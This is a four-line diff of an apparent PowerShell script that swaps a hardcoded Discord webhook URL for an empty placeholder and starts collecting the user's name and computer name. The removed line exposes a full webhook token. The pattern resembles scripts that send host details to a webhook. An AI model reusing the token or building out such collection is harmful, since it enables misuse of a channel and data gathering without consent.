@@ -1,4 +1,4 @@
-$WebhookUrl = "https://discord.com/api/webhooks/1325924265010135134/pKq11YloFU6xEoHVuzwYLblFdkdADmyDzcwmQOgr6xSrn30nA-32Gtr91hLisCoUaq2h"
+$WebhookUrl = "" # Insert Discord webhook URL here
 $SystemInfo = @{
     Username     = $env:UserName
     ComputerName = $env:COMPUTERNAME
